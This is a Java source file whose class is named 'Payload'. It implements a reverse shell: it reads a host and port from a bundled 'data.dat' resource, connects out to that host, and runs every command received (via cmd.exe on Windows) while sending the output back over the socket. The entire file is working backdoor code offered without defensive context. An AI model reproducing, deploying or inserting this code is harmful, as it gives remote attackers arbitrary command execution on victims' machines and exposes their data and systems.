package east;

import java.io.*;
import java.net.*;

public class Payload extends ClassLoader{
	private static String OS = System.getProperty("os.name").toLowerCase();
	public static void main(String[] args) throws IOException {	    

	    String[] data = parseFileContent("data.dat");
		String host = data[0];
		int port = Integer.parseInt(data[1]);
		Socket socket = new Socket(host, port);

	    while (true) {
			BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
			String command = br.readLine();

			if (command.equalsIgnoreCase("exit")) break;
		    String res;
		    if (isWindows()) {
			    res = executeCommand(new String[]{"cmd.exe", "/C", command});
			}
			// TODO write handler for other OS
			else
				res = executeCommand(command.split(" "));			

			out.println(res);
		}
		socket.close();            
	}  

	public static String executeCommand(String[] command) {

		StringBuffer output = new StringBuffer();
		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line = "";			
			while ((line = reader.readLine())!= null) {
				output.append(line + "\n");
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return output.toString();

	}

	public static String[] parseFileContent(String path) {
		InputStream in = Payload.class.getResourceAsStream(path);
		BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        StringBuilder out = new StringBuilder();
        String line;
        try {
	        while ((line = reader.readLine()) != null) {
	            out.append(line);
	        }
	     
	        String text = out.toString();
	        reader.close();
	    } catch(IOException e) {
	    	System.out.println(e.toString());
	    }
	    String text = out.toString();
		return text.split(";");	
		// return new String[]{};    
	}

	public static boolean isWindows() {
        return (OS.indexOf("win") >= 0);
    }

    public static boolean isUnix() {
        return (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0 || OS.indexOf("aix") > 0 );
    }
}

